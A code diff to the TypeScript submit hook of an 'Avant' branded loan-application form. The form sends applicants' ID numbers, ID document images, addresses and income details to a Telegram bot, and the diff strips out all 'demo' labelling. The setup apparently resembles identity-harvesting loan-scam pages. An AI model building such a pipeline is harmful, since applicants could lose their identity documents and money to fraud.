@@ -1,9 +1,9 @@
 /*
  * Application submit hook.
  *
- * DEMO-SAFE BY DEFAULT: if VITE_TELEGRAM_API_URL is not set at build time,
+ * SAFE BY DEFAULT: if VITE_TELEGRAM_API_URL is not set at build time,
  * this never touches the network — it returns { delivered: false } and the UI
- * shows the "nothing was sent" demo success state.
+ * shows the "nothing was sent" offline success state.
  *
  * Once Ronald provides a backend URL (a Cloudflare Worker / serverless function
  * that holds the Telegram bot token as a secret — see server/telegram-worker.js),
@@ -21,11 +21,11 @@ export interface SubmitResult {
 
 /** Human-friendly labels + grouping for the Telegram message and summary. */
 export const FIELD_GROUPS: { title: string; fields: [string, string][] }[] = [
-  { title: "Loan request", fields: [["loan-type", "Loan type"], ["loan-amount", "Loan amount (USD)"], ["loan-duration", "Loan duration"]] },
-  { title: "Applicant", fields: [["first-name", "First name"], ["last-name", "Last name"], ["email", "Email"], ["birth-date", "Birth date"], ["marital", "Marital status"], ["dependents", "Dependents"], ["residency", "Residency"], ["second-applicant", "Second applicant"]] },
+  { title: "Loan request", fields: [["loan-type", "Loan type"], ["loan-amount", "Loan amount"], ["loan-amount-usd", "USD equivalent"], ["loan-duration", "Loan duration"]] },
+  { title: "Applicant", fields: [["first-name", "First name"], ["last-name", "Last name"], ["email", "Email"], ["birth-date", "Birth date"], ["marital", "Marital status"]] },
   { title: "Identity", fields: [["id-type", "ID type"], ["id-number", "ID number"], ["id-expiry", "ID expiry"]] },
   { title: "Address", fields: [["street", "Street"], ["street-2", "Street line 2"], ["city", "City"], ["region", "Region"], ["postal", "Postal / ZIP"], ["country", "Country"]] },
-  { title: "Employment & income", fields: [["employment", "Employment"], ["employer", "Employer"], ["job-title", "Job title"], ["years-employed", "Years employed"], ["annual-income", "Gross annual income"], ["other-income", "Other monthly income"], ["monthly-debts", "Monthly debts"], ["pay-frequency", "Pay frequency"]] },
+  { title: "Employment & income", fields: [["employment", "Employment"], ["employer", "Employer"], ["job-title", "Job title"], ["years-employed", "Years with employer"], ["own-business-name", "Business name (self-employed)"], ["years-in-business", "Years in business"], ["annual-income", "Gross annual income"], ["other-income", "Other monthly income"], ["monthly-debts", "Monthly debts"], ["pay-frequency", "Pay frequency"]] },
   { title: "Loan details", fields: [["purpose", "Purpose"], ["vehicle-make", "Vehicle make"], ["vehicle-model", "Vehicle model"], ["vehicle-year", "Vehicle year"], ["business-name", "Business name"], ["school-name", "School / program"], ["notes", "Notes"]] },
 ]
 
@@ -33,7 +33,8 @@ export type IdDocs = { front?: File; back?: File }
 
 export function buildSummaryText(data: Application, docs: IdDocs = {}): string {
   const ts = new Date().toISOString()
-  const lines: string[] = ["Avant Loans Middle East — demo application", `Submitted: ${ts}`, ""]
+  const lines: string[] = ["Avant Middle East — new loan enquiry", `Submitted: ${ts}`, ""]
+  if ((data.preferredContact ?? "").trim()) lines.splice(1, 0, `Preferred contact: ${data.preferredContact}`)
   for (const g of FIELD_GROUPS) {
     const rows = g.fields.filter(([k]) => (data[k] ?? "").trim() !== "")
     if (!rows.length) continue
@@ -47,7 +48,7 @@ export function buildSummaryText(data: Application, docs: IdDocs = {}): string {
 }
 
 export async function submitApplication(data: Application, docs: IdDocs = {}): Promise<SubmitResult> {
-  if (!isLive) return { delivered: false } // demo mode: no network at all
+  if (!isLive) return { delivered: false } // no backend configured: no network at all
 
   const payload = {
     source: "avant-loans-3d",
